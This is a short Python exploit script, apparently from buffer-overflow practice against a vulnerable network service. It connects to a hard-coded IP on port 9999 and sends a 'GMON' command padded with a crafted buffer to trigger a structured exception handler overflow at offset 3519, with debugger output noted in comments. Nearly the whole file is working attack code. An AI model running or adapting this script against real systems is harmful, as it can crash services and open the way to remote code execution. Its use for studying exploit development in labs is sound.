import socket

IP = '35.182.31.212'


# Got an exact match at 3519

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, 9999))
sock.recv(1024)

# this is the most important line, we are doing a structured exception handler overflow
GMON = "GMON /.:/".encode()
buffer = GMON + 'A'.encode() * 3519 + '\x48\x6D\x6F\x54'.encode() + 'C'.encode() * (5050 - 3519 - 4)

print("Sending...")
sock.send(buffer)
sock.close()
print("Done")
exit(0)

#SEH chain of thread 00000B84, item 0 Address=021FFFC4 SE handler=45336E45      - found at 3519
